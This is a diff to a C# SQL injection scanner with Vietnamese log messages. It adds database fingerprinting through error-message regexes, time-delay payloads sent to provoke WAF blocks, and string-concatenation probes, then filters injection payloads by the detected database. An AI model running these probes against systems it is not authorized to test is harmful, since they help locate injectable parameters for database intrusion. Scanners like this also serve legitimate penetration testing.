@@ -1,4 +1,5 @@
 ﻿using AngleSharp.Html.Parser;
+using Microsoft.VisualBasic;
 using SQLiScanner.Models;
 using SQLiScanner.Models.Enums;
 using SQLiScanner.Services;
@@ -6,6 +7,7 @@ using SQLiScanner.Utilities;
 using SQLiScanner.Utility;
 using System.Net;
 using System.Net.Http.Headers;
+using System.Reflection.PortableExecutable;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -25,6 +27,30 @@ namespace SQLiScanner.Modules
         private readonly string _errorBasedXmlPath;
         private readonly string _booleanBlindXmlPath;
         private readonly string _timeBlindXmlPath;
+
+        private static readonly Dictionary<string, Regex> ErrorSignatures = new Dictionary<string, Regex>(StringComparer.OrdinalIgnoreCase)
+        {
+            {
+                "SQLite",
+                new Regex(@"unrecognized token|incomplete input|SQLiteException|SQLite[ _-]Driver|System\.Data\.SQLite", RegexOptions.IgnoreCase | RegexOptions.Compiled)
+            },
+            {
+                "MySQL",
+                new Regex(@"SQL syntax.*MySQL|Warning.*mysql_.*|MySqlClient\.|right syntax to use near", RegexOptions.IgnoreCase | RegexOptions.Compiled)
+            },
+            {
+                "MSSQL",
+                new Regex(@"Driver.*SQL[-_ ]*Server|OLE DB.*SQL Server|System\.Data\.SqlClient\.|Unclosed quotation mark after the character string", RegexOptions.IgnoreCase | RegexOptions.Compiled)
+            },
+            {
+                "Oracle",
+                new Regex(@"ORA-[0-9]{4,5}|Oracle.*Driver|quoted string not properly terminated", RegexOptions.IgnoreCase | RegexOptions.Compiled)
+            },
+            {
+                "PostgreSQL",
+                new Regex(@"PostgreSQL.*ERROR|Warning.*\Wpg_.*|Npgsql\.|unterminated quoted string", RegexOptions.IgnoreCase | RegexOptions.Compiled)
+            }
+        };
 
         public const string INT_PAYLOAD_1 = "1";
         public const string INT_PAYLOAD_2 = "1-1";
@@ -55,7 +81,7 @@ namespace SQLiScanner.Modules
                 InjectionRoute route = InjectionRoute.CreateStandard(paramName, originalValue);
 
                 config.OnProgress?.Invoke("Đang tải cấu trúc trang gốc (Baseline)...");
-                var (baseHtml, baseBytes, baseStatus, _,baseHeaders) = await _requestService.RequestAsync(target, originalValue, route, config.Token);
+                var (baseHtml, baseBytes, baseStatus, _, baseHeaders) = await _requestService.RequestAsync(target, originalValue, route, config.Token);
                 if (baseBytes == null)
                 {
                     result.Status = "FAILED";
@@ -134,6 +160,8 @@ namespace SQLiScanner.Modules
                     config.OnProgress?.Invoke($"[-] Định tuyến bình thường: Sử dụng tham số URL/Form để truyền Payload.");
                 }
 
+                result.TargetDBMS = await DetectDbmsViaWafAsync(target, route, config);
+
                 config.OnProgress?.Invoke($"XÁC ĐỊNH NGỮ CẢNH CỦA {target.BaseUrl} (Tham số: {paramName})");
                 // PHASE 1: Kiểm tra ngữ cảnh là INTEGER
                 config.OnProgress?.Invoke("Kiểm tra ngữ cảnh integer...");
@@ -144,7 +172,7 @@ namespace SQLiScanner.Modules
                     // PHASE 2: Kiểm tra liệu ngữ cảnh có phải là string-like
                     config.OnProgress?.Invoke("[PHASE 2] KIỂM TRA NGỮ CẢNH STRING THÔNG QUA ERROR-BASED");
                     await Phase2_DetectStringContextAsync(
-                        target, baseStatus, baseBytes.Length, baseHtml, 
+                        target, baseStatus, baseBytes.Length, baseHtml,
                         result, route, config
                     );
                 }
@@ -155,7 +183,7 @@ namespace SQLiScanner.Modules
                     // PHASE 3: Xác định ngữ cảnh
                     config.OnProgress?.Invoke("[PHASE 3] XÁC ĐỊNH CHÍNH XÁC BOUNDARY");
                     await Phase3_VerifyBoundaryAsync(
-                        target, baseStatus, baseBytes.Length, baseHtml, 
+                        target, baseStatus, baseBytes.Length, baseHtml,
                         result, route, config
                     );
                 }
@@ -287,7 +315,7 @@ namespace SQLiScanner.Modules
             };
         }
 
-        public async Task<List<PayloadType>> LoadApplicablePayloads(int stype = 0)
+        public async Task<List<PayloadType>> LoadPayloadsByType(int stype = 0)
         {
             var allPayloads = new List<PayloadType>();
 
@@ -314,6 +342,70 @@ namespace SQLiScanner.Modules
         }
 
         #region Các hàm phụ trợ
+        private async Task<string> DetectDbmsViaWafAsync(
+            CrawlResult target, InjectionRoute route, ScanConfig config)
+        {
+            config.OnProgress?.Invoke("Đoán DBMS qua phản ứng của WAF...");
+
+            var tests = new (string DBMS, string NakedPayload)[]
+            {
+                ("MySQL", " SLEEP(5)"),
+                ("MSSQL", " WAITFOR DELAY '0:0:5'"),
+                ("PostgreSQL", " PG_SLEEP(5)"),
+                ("Oracle", " DBMS_PIPE.RECEIVE_MESSAGE('a',5)"),
+            };
+            var results = new List<(string DBMS, int StatusCode)>(4);
+            foreach (var test in tests)
+            {
+                if (config.Token.IsCancellationRequested)
+                {
+                    return "UNKNOWN";
+                }
+
+                string payload = $"{route.OriginalValue}{test.NakedPayload}";
+                config.OnProgress?.Invoke($"[WAF Fingerprint] Đang gửi thử nghiệm cho {test.DBMS}...");
+
+                try
+                {
+                    var (_, bytes, statusCode, _, _) = await _requestService.RequestAsync(target, payload, route, config.Token);
+
+                    if (bytes != null)
+                    {
+                        results.Add((test.DBMS, statusCode));
+                        config.OnProgress?.Invoke($"[WAF Fingerprint] Phản hồi {test.DBMS}: HTTP Status {statusCode}");
+                    }
+                    else
+                    {
+                        results.Add((test.DBMS, 0));
+                        config.OnProgress?.Invoke($"[WAF Fingerprint] Phản hồi {test.DBMS}: HTTP Status {statusCode}. Nghi vấn Time-based");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    results.Add((test.DBMS, 0));
+                    config.OnProgress?.Invoke($"[WAF Fingerprint] Gửi payload {test.DBMS} thất bại do ngoại lệ: {ex.Message}");
+                }
+            }
+            var blockedDbmsList = results.Where(r => r.StatusCode == 403 || r.StatusCode == 406).ToList();
+            var timeOutList = results.Where(r => r.StatusCode == 0).ToList();
+            // Nếu có điẻm khác biệt thì chốt luôn
+            if (blockedDbmsList.Count == 1)
+            {
+                string detectedDbms = blockedDbmsList[0].DBMS;
+                config.OnProgress?.Invoke($"[WAF Fingerprint] ĐÃ NHẬN DIỆN: Chỉ duy nhất payload của [{detectedDbms}] bị WAF chặn (Status {blockedDbmsList[0].StatusCode})!");
+                return detectedDbms;
+            }
+            // Nghi vấn time-based do chỉ có một đối tượng không trả về status code
+            if (timeOutList.Count == 1)
+            {
+                string detectedDbms = timeOutList[0].DBMS;
+                config.OnProgress?.Invoke($"[WAF Fingerprint] ĐÃ NHẬN DIỆN: Chỉ duy nhất payload của [{detectedDbms}] bị time-out!");
+                return detectedDbms;
+            }
+            config.OnProgress?.Invoke("[WAF Fingerprint] Không phát hiện sự phản ứng phân biệt rõ ràng nào từ phía WAF. Trả về UNKNOWN.");
+            return "UNKNOWN";
+        }
+
         private async Task Phase1_DetectIntegerContextAsync(
             CrawlResult target, HeuristicResult result,
             InjectionRoute route, ScanConfig config)
@@ -423,6 +515,21 @@ namespace SQLiScanner.Modules
                     continue;
                 }
 
+                // Kiểm tra phản hồi thông báo lỗi có các cú pháp lỗi đặc trưng
+                if (!string.IsNullOrEmpty(testHtml) && (result.TargetDBMS == "UNKNOWN" || string.IsNullOrEmpty(result.TargetDBMS)))
+                {
+                    foreach (var signature in ErrorSignatures)
+                    {
+                        if (signature.Value.IsMatch(testHtml))
+                        {
+                            result.TargetDBMS = signature.Key;
+                            config.OnProgress?.Invoke($"[Fingerprint] Đã nhận diện được chữ ký lỗi của [{signature.Key}] rò rỉ trên giao diện HTML!");
+                            
+                            break;
+                        }
+                    }
+                }
+
                 double similarity = CalculateSimilarity(
                     baselineStatus, baselineLength, baselineHtml,
                     testStatus, testBytes.Length, testHtml,
@@ -456,8 +563,19 @@ namespace SQLiScanner.Modules
             HeuristicResult result, InjectionRoute route, ScanConfig config)
         {
             config.OnProgress?.Invoke("KỲ VỌNG: Xác định chính xác boundary thông qua thử từng boundary bằng BOOLEAN LOGIC.");
-            config.OnProgress?.Invoke("Sử dụng 2 payload True (8341=8341) và False (8341=8342) để kiểm tra");
+            if (result.TargetDBMS == "UNKNOWN" || string.IsNullOrEmpty(result.TargetDBMS))
+            {
+                string detectedDbms = await TryDetectDbmsViaConcatenationAsync(
+                    target, route.OriginalValue, baselineStatus, baselineLength, baselineHtml, route, config);
 
+                if (detectedDbms != "UNKNOWN")
+                {
+                    result.TargetDBMS = detectedDbms;
+                    config.OnProgress?.Invoke($"[Phase 3] Xác định sơ bộ CSDL là [{detectedDbms}]. Tiến hành kiểm tra phá vỡ cấu trúc...");
+                }
+            }
+
+            config.OnProgress?.Invoke("Sử dụng 2 payload True (8341=8341) và False (8341=8342) để kiểm tra các Boundary...");
             double SIMILARITY_THRESHOLD = 1.0 - target.PageTolerance;
 
             foreach (var boundary in result.ApplicableBoundaries)
@@ -510,11 +628,12 @@ namespace SQLiScanner.Modules
                 if (isInverseMatch) config.OnProgress?.Invoke("Phát hiện: False giống Base, True khác Base (Trường hợp Bypass / Original Value là sai)");
 
                 // Bổ sung: Đảm bảo độ chênh lệch giữa True và False phải đủ lớn (ví dụ > 5%) để tránh nhiễu
-                bool hasSignificantDifference = Math.Abs(simTrue - simFalse) >= 0.05;
+                bool hasSignificantDifference = Math.Abs(simTrue - simFalse) >= target.PageTolerance;
 
                 if ((isRegularMatch || isInverseMatch) && hasSignificantDifference)
                 {
                     config.OnProgress?.Invoke($"[SUCCESS] Boundary Worked: {boundary.ContextName}");
+
                     result.LockedBoundary = boundary;
                     result.ApplicableBoundaries.Clear();
                     result.ApplicableBoundaries.Add(boundary);
@@ -577,14 +696,28 @@ namespace SQLiScanner.Modules
                 allPayloads.AddRange(booleanPayloads);
                 allPayloads.AddRange(timePayloads);
 
+                IEnumerable<PayloadType> filteredPayloads = allPayloads;
+                bool isDbmsIdentified = !string.IsNullOrEmpty(result.TargetDBMS) &&
+                               !result.TargetDBMS.Equals("UNKNOWN", StringComparison.OrdinalIgnoreCase);
+
+                if (isDbmsIdentified) 
+                {
+                    filteredPayloads = allPayloads.Where(p =>
+                        p.DBMS.Equals(result.TargetDBMS, StringComparison.OrdinalIgnoreCase) ||
+                        // Tính trường hợp các payload dùng chung cho toàn bộ database
+                        string.IsNullOrEmpty(p.DBMS) ||
+                        p.DBMS.Equals("UNKNOWN", StringComparison.OrdinalIgnoreCase) ||
+                        p.DBMS.Equals("GENERIC", StringComparison.OrdinalIgnoreCase)
+                    );
+                }
+
                 // Sort: Level (easy → hard) then Risk (low → high)
-                result.ApplicablePayloads = allPayloads
+                result.ApplicablePayloads = filteredPayloads
                     .OrderBy(p => p.Level)
                     .ThenBy(p => p.Risk)
                     .ToList();
-
             }
-            catch (Exception){}
+            catch (Exception) { }
         }
         private async Task<List<Boundary>> GetAllApplicableBoundaries()
         {
@@ -692,6 +825,99 @@ namespace SQLiScanner.Modules
                 for (int j = 0; j < v0.Length; j++) v0[j] = v1[j];
             }
             return v1[target.Length];
+        }
+
+        private async Task<bool> IsConcatenationMatchAsync(
+            CrawlResult target,
+            string payload,
+            InjectionRoute route,
+            int baselineStatus,
+            int baselineLength,
+            string baselineHtml,
+            CancellationToken cancellationToken)
+        {
+            var (html, bytes, status, _, _) = await _requestService.RequestAsync(target, payload, route, cancellationToken);
+            if (bytes == null) return false;
+
+            double similarity = CalculateSimilarity(
+                baselineStatus, baselineLength, baselineHtml,
+                status, bytes.Length, html,
+                target.PageTolerance);
+
+            double threshold = 1.0 - target.PageTolerance;
+            return similarity >= threshold;
+        }        
+
+        private async Task<string> TryDetectDbmsViaConcatenationAsync(
+            CrawlResult target,
+            string originalValue,
+            int baselineStatus,
+            int baselineLength,
+            string baselineHtml,
+            InjectionRoute route,
+            ScanConfig config)
+        {
+            if (string.IsNullOrEmpty(originalValue) || originalValue.Length < 2)
+            {
+                config.OnProgress?.Invoke("[Concatenation] OriginalValue quá ngắn. Bỏ qua kĩ thuật nối chuỗi");
+                return "UNKNOWN";
+            }
+
+            int mid = originalValue.Length / 2;
+            string str1 = originalValue.Substring(0, mid);
+            string str2 = originalValue.Substring(mid);
+
+            char[] separators = { '\'', '"' };
+
+            config.OnProgress?.Invoke($"[Concatenation] Đoán database bằng kĩ thuật nối chuỗi");
+
+            foreach (char separator in separators)
+            {
+                if (config.Token.IsCancellationRequested) return "UNKNOWN";
+
+                // Kiểm tra MSSQL (sử dụng '+')
+                // VD: adm'+'in
+                string mssqlPayload = $"{str1}{separator}+{separator}{str2}";
+                if (await IsConcatenationMatchAsync(target, mssqlPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
+                {
+                    config.OnProgress?.Invoke($"[Concatenation] [MATCH] Nhận diện dấu hiệu của [MSSQL] qua dấu nháy [{separator}].");
+                    return "MSSQL";
+                }
+
+                // Kiểm tra MySQL (Nối bằng khoảng trắng)
+                // VD: adm' 'in
+                string mysqlPayload = $"{str1}{separator} {separator}{str2}";
+                if (await IsConcatenationMatchAsync(target, mysqlPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
+                {
+                    config.OnProgress?.Invoke($"[Concatenation] [MATCH] Nhận diện dấu hiệu của [MySQL] qua dấu nháy [{separator}].");
+                    return "MySQL";
+                }
+
+                // Kiểm tra nhóm ANSI (Oracle, PostgreSQL, SQLite sử dụng toán tử '||')
+                // VD: adm'||'in
+                string ansiPayload = $"{str1}{separator}||{separator}{str2}";
+                if (await IsConcatenationMatchAsync(target, ansiPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
+                {
+                    config.OnProgress?.Invoke($"[Concatenation] Khớp phép nối chuỗi ANSI (||) bằng dấu nháy [{separator}]. Đang chạy cây quyết định...");
+                    // 1. Phân biệt Oracle bằng nối thêm NULL (vì orcal đối xử null như một chuỗi rỗng)
+                    string oraclePayload = $"{str1}{separator}||NULL||{separator}{str2}";
+                    if (await IsConcatenationMatchAsync(target, oraclePayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
+                    {
+                        return "Oracle";
+                    }
+
+                    // 2. Phân biệt PostgreSQL (sử dụng toán tử '::text' để ép kiểu)
+                    string pgPayload = $"{str1}{separator}::text||{separator}{str2}";
+                    if (await IsConcatenationMatchAsync(target, pgPayload, route, baselineStatus, baselineLength, baselineHtml, config.Token))
+                    {
+                        return "PostgreSQL";
+                    }
+
+                    return "SQLite";
+                }
+            }
+
+            return "UNKNOWN";
         }
         #endregion
 
@@ -825,7 +1051,7 @@ namespace SQLiScanner.Modules
             string mutatedValue = int.TryParse(originalValue, out _) ? "999" : "mutated_state_check";
             // Request Baseline (Tham số gốc, không truyền cookie)
             var (baseHtml, baseBytes, baseStatus, _, _) = await _requestService.RequestAsync(
-                target, 
+                target,
                 originalValue,
                 InjectionRoute.CreateStandard(paramName, originalValue),
                 cancellationToken);
@@ -834,7 +1060,7 @@ namespace SQLiScanner.Modules
 
             // Request Mutation (Tham số đột biến, không truyền Cookie)
             var (mutatedHtml, mutatedBytes, mutatedStatus, _, _) = await _requestService.RequestAsync(
-                target, 
+                target,
                 mutatedValue,
                 InjectionRoute.CreateStandard(paramName, originalValue),
                 cancellationToken);
